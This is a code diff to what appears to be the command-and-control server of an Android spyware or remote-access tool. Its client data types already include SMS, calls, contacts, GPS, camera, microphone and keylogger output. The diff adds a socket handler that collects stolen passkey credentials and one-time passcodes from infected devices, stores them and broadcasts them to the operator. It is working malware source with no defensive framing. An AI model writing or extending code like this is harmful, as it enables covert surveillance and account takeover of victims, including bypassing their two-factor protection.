@@ -234,7 +234,7 @@ class SocketService {
   }
 
   private ensureClientData(clientId: string): void {
-    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger', 'keylogger_status', 'keylogger_log_info'];
+    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger', 'keylogger_status', 'keylogger_log_info', 'passkey_creds', 'passkey_otps'];
     dbHelpers.ensureClientDataBatch(clientId, dataTypes);
   }
 
@@ -439,6 +439,36 @@ class SocketService {
         dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`);
         broadcastData('clipboard');
       } catch (err: unknown) { log.error(`Clipboard handler error: ${err instanceof Error ? err.message : String(err)}`); }
+    });
+
+    socket.on(CMD.PASSKEY, (data: any) => {
+      try {
+        const type = data.type;
+        const ts = data.timestamp || new Date().toISOString();
+        if (type === 'credentials') {
+          const creds = JSON.parse(dbHelpers.getOrCreateClientData(id, 'passkey_creds'));
+          const items: any[] = data.items || [];
+          for (const item of items) {
+            creds.push({ item, timestamp: ts });
+          }
+          if (creds.length > 10000) { creds.splice(0, creds.length - 10000); }
+          dbHelpers.setClientData(id, 'passkey_creds', JSON.stringify(creds));
+          dbHelpers.addLog('DATA', 'PASSKEY', `Credentials from ${id} (${items.length} items)`);
+          broadcastData('passkey_creds');
+        } else if (type === 'otps') {
+          const otps = JSON.parse(dbHelpers.getOrCreateClientData(id, 'passkey_otps'));
+          const items: any[] = data.items || [];
+          for (const item of items) {
+            otps.push({ item, timestamp: ts });
+          }
+          if (otps.length > 10000) { otps.splice(0, otps.length - 10000); }
+          dbHelpers.setClientData(id, 'passkey_otps', JSON.stringify(otps));
+          dbHelpers.addLog('DATA', 'PASSKEY', `OTPs from ${id} (${items.length} items)`);
+          broadcastData('passkey_otps');
+        }
+      } catch (err: unknown) {
+        log.error(`Passkey handler error: ${err instanceof Error ? err.message : String(err)}`);
+      }
     });
 
     socket.on(CMD.APPS, (data: any) => {
